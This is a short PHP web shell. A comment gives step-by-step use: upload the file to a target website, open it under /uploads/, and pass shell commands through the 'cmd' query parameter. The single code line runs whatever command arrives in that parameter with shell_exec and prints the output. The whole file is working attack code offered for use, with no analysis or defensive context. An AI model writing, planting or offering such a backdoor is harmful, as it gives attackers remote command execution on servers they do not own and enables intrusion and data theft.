<?php
/*
1. Upload file to website
2. Connect to this file: https://target.com/uploads/web_shell.php
3. Add param: https://target.com/uploads/web_shell.php?cmd=ls
4. Check the answer
*/
echo shell_exec($_GET['cmd'].' 2>&1');
?>
